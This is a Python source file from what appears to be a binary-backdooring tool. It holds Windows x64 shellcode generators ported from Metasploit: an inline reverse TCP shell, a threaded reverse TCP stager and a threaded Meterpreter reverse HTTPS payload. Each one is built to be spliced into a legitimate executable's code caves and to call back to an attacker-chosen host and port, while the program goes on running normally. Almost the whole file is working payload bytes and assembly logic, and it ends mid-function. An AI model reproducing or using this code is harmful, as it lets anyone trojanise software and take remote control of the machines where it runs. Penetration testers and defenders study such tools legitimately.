''''

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################

import struct
from intelmodules import eat_code_caves


class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """

    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        self.HOST = HOST
        self.PORT = PORT
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = ("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = ("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )
        self.apis_needed = None

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def clean_caves_stub(self, CavesToFix):
        stub = ("\x48\x31\xC0"                          # xor rax,rax
                "\x48\x31\xC9"                          # xor rcx,rcx
                "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
                "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
                "\x48\x89\xCB"                          # mov rbx,rcx
                )
        for cave, values in CavesToFix.iteritems():
            stub += "\x48\xbf"                          # mov rdi, value below
            stub += struct.pack("<Q", values[0])
            stub += "\x48\x01\xDF"                      # add rdi, rbx
            stub += "\x48\xb9"                          # mov rcx, value below
            stub += struct.pack("<Q", values[1])
            stub += "\xf3\xaa"                          # REP STOS BYTE PTR ES:[EDI]
        return stub

    def reverse_shell_tcp_inline(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8")

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!H', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def reverse_tcp_stager_threaded(self, flItms, CavesPicked={}):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1)
        with the help of Steven Fewer's work on msf win64 payloads.
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)

        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"

        """
        shellcode2
        /*
         * windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
           ^^windows/x64/meterpreter/reverse_tcp will work with this
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080,
         */
         """

        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 90

        #payload
        self.shellcode2 += ("\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            "\x49\x89\xe5\x49\xbc\x02\x00"
                            )
        self.shellcode2 += struct.pack('!H', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            "\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            "\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            "\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            "\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            "\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            "\xff\xe7"
                            )

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to itterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               # ; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               # ; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               #  ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               # ; We now automagically return to the correct caller...
                           # get_next_mod:
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           # get_next_mod1:
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
                           # allocate
        self.shellcode1 += ("\x5d"                              # pop rbp
                            "\x49\xc7\xc6")                     # mov r14, size of payload below
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += ("\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            "\x48\xC7\xC1"
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43"

                            # got_payload:
        self.shellcode1 += ("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"  # xor rax,rax

                            "\x50"                                   # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                   # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                           # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                           # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                           # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                           # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"           # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                               # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                       # add rsp, 50
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            #self.shellcode1 += "\xE9\xab\x01\x00\x00"
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https_threaded(self, flItms, CavesPicked={}):
        """
        Win64 version
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)

        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"

        """
         /*
         * windows/x64/meterpreter/reverse_https - 587 bytes (stage 1)
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080,
         * SessionExpirationTimeout=604800,
         * SessionCommunicationTimeout=300,
         * MeterpreterUserAgent=Mozilla/4.0 (compatible; MSIE 6.1;
         * Windows NT), MeterpreterServerName=Apache,
         * ReverseListenerBindPort=0,
         * HttpUnknownRequestResponse=<html><body><h1>It
         * works!</h1></body></html>, EnableStageEncoding=false,
         * PrependMigrate=false, EXITFUNC=thread, AutoLoadStdapi=true,
         * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
         * EnableUnicodeEncoding=true
         */
        """
        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 90

        #payload
        self.shellcode2 += ("\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
                            "\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
                            "\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                            "\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
                            "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
                            "\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
                            "\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
                            "\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
                            "\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56"
                            "\x49\x89\xe6\x4c\x89\xf1\x49\xba\x4c\x77\x26\x07\x00\x00\x00"
                            "\x00\xff\xd5\x6a\x00\x6a\x00\x48\x89\xe1\x48\x31\xd2\x4d\x31"
                            "\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                            "\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                            "\xb8")
        self.shellcode2 += struct.pack("<H", self.PORT)
        self.shellcode2 += ("\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                            "\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                            "\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
                            "\x52\x68\x00\x32\xa0\x84\x52\x52\x49\xba\xeb\x55\x2e\x3b\x00"
                            "\x00\x00\x00\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48"
                            "\xba\x1f\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x68\x80\x33\x00"
                            "\x00\x49\x89\xe0\x49\xb9\x04\x00\x00\x00\x00\x00\x00\x00\x49"
                            "\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x48\x89\xf1\x48"
                            "\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x49\xba\x2d\x06\x18"
                            "\x7b\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x24\x48\xff\xcf\x74"
                            "\x13\xeb\xb1\xe9\x81\x00\x00\x00\xe8\x7f\xff\xff\xff\x2f\x75"
                            "\x47\x48\x58\x00\x00\x49\xbe\xf0\xb5\xa2\x56\x00\x00\x00\x00"
                            "\xff\xd5\x48\x31\xc9\x48\xba\x00\x00\x40\x00\x00\x00\x00\x00"
                            "\x49\xb8\x00\x10\x00\x00\x00\x00\x00\x00\x49\xb9\x40\x00\x00"
                            "\x00\x00\x00\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
                            "\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
                            "\x49\xb8\x00\x20\x00\x00\x00\x00\x00\x00\x49\x89\xf9\x49\xba"
                            "\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
                            "\xc0\x74\x99\x48\x8b\x07\x48\x01\xc3\x48\x85\xc0\x75\xce\x58"
                            "\x58\xc3\xe8\xd7\xfe\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 += "\x00"
        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
